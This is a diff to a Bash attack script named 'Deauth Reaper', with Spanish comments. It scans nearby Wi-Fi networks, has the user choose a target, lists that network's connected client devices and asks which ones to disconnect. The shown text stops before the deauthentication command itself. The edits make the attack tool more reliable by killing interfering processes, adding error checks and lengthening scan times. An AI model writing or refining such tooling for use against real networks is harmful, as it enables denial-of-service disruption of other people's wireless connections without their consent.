@@ -21,15 +21,29 @@ fi
 # Nombre de la interfaz Wi-Fi en modo monitor
 INTERFACE="wlan0mon"
 
-# Iniciar la interfaz en modo monitor
+# **Verificar que la interfaz esté en modo monitor**
+# Iniciar la interfaz en modo monitor si no está en ese modo
 echo -e "${MAGENTA}💀 [Deauth Reaper] Activando modo monitor en la interfaz...${RESET}"
+airmon-ng check kill > /dev/null 2>&1 # Mata procesos que interfieren
 airmon-ng start wlan0 > /dev/null 2>&1
+
+# Verifica que la interfaz esté correctamente en modo monitor
+if ! iwconfig | grep -q "$INTERFACE"; then
+    echo -e "${RED}❌ ERROR: No se pudo activar el modo monitor en la interfaz $INTERFACE.${RESET}"
+    exit 1
+fi
 
 # Escanear redes Wi-Fi y mostrar opciones
 echo -e "${CYAN}📡 Escaneando redes Wi-Fi disponibles...${RESET}"
 airodump-ng "$INTERFACE" --output-format csv --write redes_scan > /dev/null 2>&1 &
-sleep 5
+sleep 10  # Asegurarse de que haya suficiente tiempo para capturar redes
 pkill airodump-ng
+
+# Verificar si se generaron archivos .csv correctamente
+if [ ! -f "redes_scan-01.csv" ]; then
+    echo -e "${RED}❌ ERROR: No se encontraron archivos de redes. Asegúrate de que tu tarjeta Wi-Fi está en modo monitor y hay redes disponibles.${RESET}"
+    exit 1
+fi
 
 # Mostrar redes encontradas
 echo -e "${YELLOW}🔍 Redes Wi-Fi detectadas:${RESET}"
@@ -41,19 +55,23 @@ read -p "🎯 Elige el número de la red objetivo: " RED_NUM
 BSSID=$(awk -F, -v num=$((RED_NUM+2)) 'NR==num {print $1}' redes_scan-01.csv)
 CHANNEL=$(awk -F, -v num=$((RED_NUM+2)) 'NR==num {print $4}' redes_scan-01.csv)
 
+if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
+    echo -e "${RED}❌ ERROR: Opción de red inválida. Por favor, selecciona un número de la lista válida.${RESET}"
+    exit 1
+fi
+
 echo -e "${GREEN}✅ Red seleccionada: $BSSID en el canal $CHANNEL${RESET}"
 
 # Escanear clientes conectados automáticamente
 echo -e "${CYAN}🔎 Escaneando dispositivos conectados a la red...${RESET}"
-touch clientes_scan-01.csv  # Asegurar que el archivo existe
+touch clientes_scan-01.csv  # Asegurarse de que el archivo existe
 airodump-ng --bssid "$BSSID" -c "$CHANNEL" --output-format csv --write clientes_scan "$INTERFACE" > /dev/null 2>&1 &
-sleep 15  # 🔥 DA MÁS TIEMPO AL ESCANEO
+sleep 15  # Da tiempo para capturar los dispositivos conectados
 pkill airodump-ng
 
-# Verificar si el archivo se creó correctamente
-CLIENTES_FILE=$(ls clientes_scan* | head -n 1)
-if [ ! -f "$CLIENTES_FILE" ]; then
-    echo -e "${RED}❌ ERROR: No se encontró el archivo de clientes. ¿Interfaz en modo monitor?${RESET}"
+# Verificar si el archivo de clientes se generó correctamente
+if [ ! -f "clientes_scan-01.csv" ]; then
+    echo -e "${RED}❌ ERROR: No se encontraron clientes conectados o el archivo no se generó.${RESET}"
     exit 1
 fi
 
@@ -64,7 +82,7 @@ echo -e "N°  |  MAC Address       |  Fabricante"
 echo -e "${BLUE}----------------------------------------${RESET}"
 
 COUNT=1
-awk -F, 'NR>2 && $1 ~ /:/ {print $1}' "$CLIENTES_FILE" | while read -r MAC; do
+awk -F, 'NR>2 && $1 ~ /:/ {print $1}' "clientes_scan-01.csv" | while read -r MAC; do
     VENDOR=$(macchanger -l | grep -i "$(echo $MAC | cut -c 1-8)" | awk -F '  ' '{print $2}' | head -n 1)
     if [ -z "$VENDOR" ]; then
         VENDOR="Desconocido"
@@ -80,7 +98,7 @@ read -p "💀 Elige el número de los dispositivos a desconectar (separados por 
 # Convertir números en MACs
 CLIENTES_MAC=()
 for NUM in $CLIENTES_NUM; do
-    CLIENTES_MAC+=($(awk -F, -v num=$((NUM+2)) 'NR==num {print $1}' "$CLIENTES_FILE"))
+    CLIENTES_MAC+=($(awk -F, -v num=$((NUM+2)) 'NR==num {print $1}' "clientes_scan-01.csv"))
 done
 
 # Desconectar los clientes seleccionados
